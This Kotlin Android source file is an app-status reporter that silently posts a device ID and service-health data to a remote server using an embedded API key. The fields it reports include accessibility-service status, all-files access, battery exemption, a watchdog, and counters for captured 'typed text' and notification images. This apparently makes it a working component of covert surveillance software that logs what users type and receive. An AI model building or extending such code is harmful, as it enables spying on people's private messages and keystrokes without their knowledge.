package com.notifyhub

import android.content.Context
import android.os.SystemClock
import android.provider.Settings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.time.Instant
import java.util.concurrent.TimeUnit

object AppStatusReporter {

    const val ROLE = "master_control"

    private const val MIN_INTERVAL_MS = 120_000L
    @Volatile private var lastReportAt = 0L

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    fun report(context: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastReportAt < MIN_INTERVAL_MS) return
        lastReportAt = now
        val app = context.applicationContext
        CoroutineScope(Dispatchers.IO).launch { post(app) }
    }

    private fun post(context: Context) {
        try {
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            val bootAt = System.currentTimeMillis() - SystemClock.elapsedRealtime()
            val json = JSONObject().apply {
                put("deviceId", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
                put("appRole", ROLE)
                put("packageName", context.packageName)
                put("appLabel", appLabel(context))
                put("versionName", BuildConfig.VERSION_NAME)
                put("listenerEnabled", ServiceHealth.isListenerEnabled(context))
                put("accessibilityEnabled", ServiceHealth.isAccessibilityEnabled(context))
                put("batteryExempt", ServiceHealth.isBatteryExempt(context))
                put("mediaEnabled", MediaSettings.isEnabled(context))
                put("allFilesAccess", MediaSettings.hasAllFilesAccess(context))
                put("listenerConnected", ServiceHealth.notificationListenerConnected)
                put("foregroundServiceRunning", SyncForegroundService.running)
                put("watchdogEnabled", ServiceHealth.isWatchdogEnabled(context))
                put("bootTime", timestamp(bootAt))
                put("installTime", timestamp(packageInfo.firstInstallTime))
                put("updateTime", timestamp(packageInfo.lastUpdateTime))
                put("lastListenerEventAt", timestamp(ServiceHealth.lastAlive(context)))
                put("typedTextConnected", ServiceHealth.typedTextConnected)
                put("typedTextAliveAt", timestamp(diag(context, AppDiagnostics.TYPED_TEXT_ALIVE_AT)))
                put("typedTextLastEventAt", timestamp(diag(context, AppDiagnostics.TYPED_TEXT_LAST_EVENT_AT)))
                put("typedServiceBindTotal", diag(context, AppDiagnostics.TYPED_SERVICE_BIND_TOTAL))
                put("typedEventsTotal", diag(context, AppDiagnostics.TYPED_EVENTS_TOTAL))
                put("typedTextSentTotal", diag(context, AppDiagnostics.TYPED_TEXT_SENT_TOTAL))
                put("typedPlaceholderRejectedTotal", diag(context, AppDiagnostics.TYPED_PLACEHOLDER_REJECTED_TOTAL))
                put("typedServiceReconnectTotal", diag(context, AppDiagnostics.TYPED_SERVICE_RECONNECT_TOTAL))
                put("watchdogLastFiredAt", timestamp(diag(context, AppDiagnostics.WATCHDOG_LAST_FIRED_AT)))
                put("notificationRebindTotal", diag(context, AppDiagnostics.NOTIFICATION_REBIND_TOTAL))
                put("listenerLastConnectedAt", timestamp(diag(context, AppDiagnostics.LISTENER_LAST_CONNECTED_AT)))
                put("listenerLastDisconnectedAt", timestamp(diag(context, AppDiagnostics.LISTENER_LAST_DISCONNECTED_AT)))
                put("notificationImagesTotal", diag(context, AppDiagnostics.NOTIFICATION_IMAGES_TOTAL))
                put("notificationImagesFailedTotal", diag(context, AppDiagnostics.NOTIFICATION_IMAGES_FAILED_TOTAL))
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/app-status")
                .header("X-API-Key", BuildConfig.API_KEY)
                .post(body)
                .build()
            client.newCall(request).execute().use { }
        } catch (_: Exception) {
        }
    }

    private fun timestamp(value: Long): String? =
        if (value <= 0L) null else Instant.ofEpochMilli(value).toString()

    private fun diag(context: Context, key: String): Long =
        AppDiagnostics.value(context, key)

    private fun appLabel(context: Context): String = try {
        context.packageManager.getApplicationLabel(
            context.packageManager.getApplicationInfo(context.packageName, 0)
        ).toString()
    } catch (_: Exception) {
        context.packageName
    }
}
